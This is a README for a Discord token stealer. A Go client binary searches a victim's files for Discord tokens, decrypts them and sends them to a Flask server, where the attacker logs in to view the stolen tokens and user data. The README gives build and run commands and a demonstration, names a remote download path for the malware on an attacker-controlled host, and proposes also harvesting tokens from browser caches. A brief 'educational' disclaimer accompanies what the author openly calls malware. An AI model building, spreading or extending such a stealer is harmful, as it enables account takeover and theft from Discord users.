# TokenStealer
> A discord token stealer client with a flask server

## Table Of Contents
* [General Info](#general-info)
* [Installation](#installation)
* [Usage](#usage)
* [Demonstration](#demonstration)
* [Ideas](#ideas)
* [Contact Me](#contact-me)
* [License](#license)

## General Info

First off a big shoutout to my friend and great hacker+dev [Lean](https://github.com/TasosY2K). He is the one who introduced me to this client-server malware architecture, so thanks for the inspiration man. Also I'm taking his disclaimer hahahaha.

This tool is purely educational and is inteded to make the internet more secure

I will not be responsible for any direct or indirect damage caused due to the usage of this tool, it is for educational purposes only.

Simply put, this app has 2 parts to it, a client go binary, and a flask python server. The go binary is a discord token stealer, it checks for files to try and find discord tokens stored locally on a users system. After finding them and decrypting them, it sends them as a request to the server. The server has an api to accept valid discord tokens, and a frontend for the user to login, and see all the tokens and user information he has received.  

Generally I've wanted to do a project like this for some time now. This isn't the most original or technical malware, but I think it's a great project to get accustomed to such an architecture. I wrote it in Go simply because it crossed my mind and i said why not. It's an interesting language with some cool stuff, but I'll need to see more of it to be convinced. As for the serverside I went with Flask, because I finally wanted to approach it from a programming perspective. I wanted to know how to use it as I think it's a strong and easy way to implement web apps for someone who likes python.

## Installation

For the client, install [go](https://go.dev/doc/install)

For the server, just install the necessary packages from `requirements.txt`

```
pip install -r requirements.txt
```

## Usage

Run the below commands. This is for my setup, change accordignly:

```
cd client
go build stealer.go
move stealer.go ..\server\application\static
cd ..\server
py run.py
```

## Demonstration

1. Run `run.py` to start the server and get the secret token

![](/screenshots/img1.png)

2. Enter the secret token

![](/screenshots/img2.png)

3. This is the index page

![](/screenshots/img3.png)

4. Go view the logs. At the start they are empty

![](/screenshots/img4.png)

5. Run the malware `stealer.exe` and refresh the page

![](/screenshots/img5.png)

This is for local use. For remote, the malware will be at `http://<attacker-ip:port>/static/stealer.exe`

## Ideas

I don't think I'll touch this again. But here are some ideas:
* Diss flask `session` for session handling and find another way, mostly to support sessions between different blueprints
* Add more functionalities like deleting users, or viewing users by id
* Have the malware check the browser cache for tokens stored there (for if user uses discord through browser)
* Write the css for the error message in login properly (never will kek)
* Use template inheritance just cause
* Fix status response code

## Contact Me

You can find me on [Twitter](https://twitter.com/3xM4ch1n4).

## License

See LICENSE for more info.